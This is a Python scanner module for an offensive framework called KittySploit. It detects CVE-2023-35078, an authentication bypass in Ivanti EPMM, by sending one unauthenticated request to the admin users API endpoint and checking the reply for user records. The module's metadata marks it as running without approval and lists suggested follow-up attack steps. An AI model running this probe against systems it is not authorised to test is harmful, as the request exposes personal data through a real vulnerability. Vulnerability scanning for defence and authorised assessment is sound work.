#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Ivanti Endpoint Manager Mobile (EPMM), formerly MobileIron Core, through 11."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ivanti Endpoint Manager Mobile (EPMM) - Authentication Bypass Detection',
        'description': 'Ivanti Endpoint Manager Mobile (EPMM), formerly MobileIron Core, through 11.10 allows remote attackers to obtain PII, add an administrative account, and change the configuration because of an authentication bypass, as exploited in the wild in July 2023. A patch is available.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'kev', 'ivanti', 'mobileiron', 'epmm', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://forums.ivanti.com/s/article/CVE-2023-35078-Remote-unauthenticated-API-access-vulnerability',
            'https://forums.ivanti.com/s/article/KB-Remote-unauthenticated-API-access-vulnerability-CVE-2023-35078',
            'https://www.cisa.gov/news-events/alerts/2023/07/24/ivanti-releases-security-updates-endpoint-manager-mobile-epmm-cve-2023-35078',
            'https://www.ivanti.com/blog/cve-2023-35078-new-ivanti-epmm-vulnerability',
            'https://help.ivanti.com/mi/help/en_us/CORE/11.2.0.0/dmgw/DMGfiles/Join_Azure_and_MobileIro.htm',
        ],
        'cve': 'CVE-2023-35078',
    }

    def run(self):
        r = self.http_request(method="GET", path='/mifs/aad/api/v2/admins/users', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('results', 'userId', 'name',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='critical',
                reason="Ivanti Endpoint Manager Mobile (EPMM) - Authentication Bypass detected",
                path='/mifs/aad/api/v2/admins/users',
            )
            return True
        return False

